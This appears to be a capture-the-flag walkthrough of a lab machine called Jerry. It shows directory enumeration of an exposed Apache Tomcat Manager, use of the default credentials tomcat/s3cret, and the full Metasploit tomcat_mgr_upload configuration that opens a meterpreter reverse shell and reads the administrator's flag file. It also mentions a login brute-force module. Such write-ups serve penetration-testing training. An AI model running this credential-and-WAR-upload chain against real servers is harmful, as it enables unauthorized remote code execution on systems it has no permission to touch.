Jerry Lab - Vulnerabilities: Weak or default credentials, Tomcat Manager WAR File Upload, Exposed Apache Tomcat Manager Interface

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1

Let’s see if we can find any directories:
gobuster dir -u http://10.129.136.9:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/] 


Logging into http://10.129.136.9:8080/manager/html gives us the page below, leading to 403 access denied.
The webpage shown however leaks the credential of tomcat and s3cret password



We use the material on it to access manager-gui with user “tomcat” and password “s3cret”
-Now we made it into the manager thing, let’s try to see if we can upload payload “ Tomcat Web Application Manager “

Let’s try to go to burp suite and see what we can do:
POST /manager/html/reload?path=/&org.apache.catalina.filters.CSRF_NONCE=515A3D91DBE1A4687CBF8243AC53D3E3 HTTP/1.1

Nothing is really there, but we can upload WAR files on the web  server through the web application manager. 

I found this:
https://null-byte.wonderhowto.com/how-to/hack-apache-tomcat-via-malicious-war-file-upload-0202593/ 

It goes to metasploit
msfconsole

search tomcat

There are multiple helpful modules:
auxiliary/scanner/http/tomcat_mgr_login  - this module brute force the manager login, we could’ve also use this to help find username and password


However, this suits our need because we already have credentials:
7   exploit/multi/http/tomcat_mgr_upload

use exploit/multi/http/tomcat_mgr_upload
options
set LHOST 10.10.14.251
set RHOSTS 10.129.136.9
set RPORT 8080
set HttpPassword s3cret
set HttpUsername tomcat
run 

We created a session on meterpreter, let’s see if we can find appropriate things now
shell - launches the windows shell since Jerry is windows server
cd ..
We can find the flags within the desktop of Administrator in file called “2 for the price of 1.txt”
type “2 for the price of 1.txt”
